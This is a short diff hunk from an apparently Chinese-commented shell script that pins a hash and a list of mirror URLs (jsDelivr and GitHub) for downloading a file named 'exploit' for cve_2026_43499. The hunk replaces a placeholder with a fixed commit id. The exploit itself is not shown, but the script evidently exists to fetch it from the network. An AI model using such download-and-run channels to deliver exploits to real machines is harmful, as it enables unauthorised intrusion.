@@ -12,8 +12,8 @@ EXP_HASH="2932cc749d63653c45c9fe38d86a4e6e17cadd0c2c5c68a452782aa02953903e"
 # 2. github.com raw 路径 (不走 raw.githubusercontent.com)
 # 3. raw.githubusercontent.com (直连, 有时可达)
 CHANNELS='
-https://cdn.jsdelivr.net/gh/1332915/-10e-@__C__/cve_2026_43499/exploit
-https://github.com/1332915/-10e-/raw/__C__/cve_2026_43499/exploit
+https://cdn.jsdelivr.net/gh/1332915/-10e-@4348af8/cve_2026_43499/exploit
+https://github.com/1332915/-10e-/raw/4348af8/cve_2026_43499/exploit
 https://raw.githubusercontent.com/1332915/-10e-/main/cve_2026_43499/exploit
 '
 
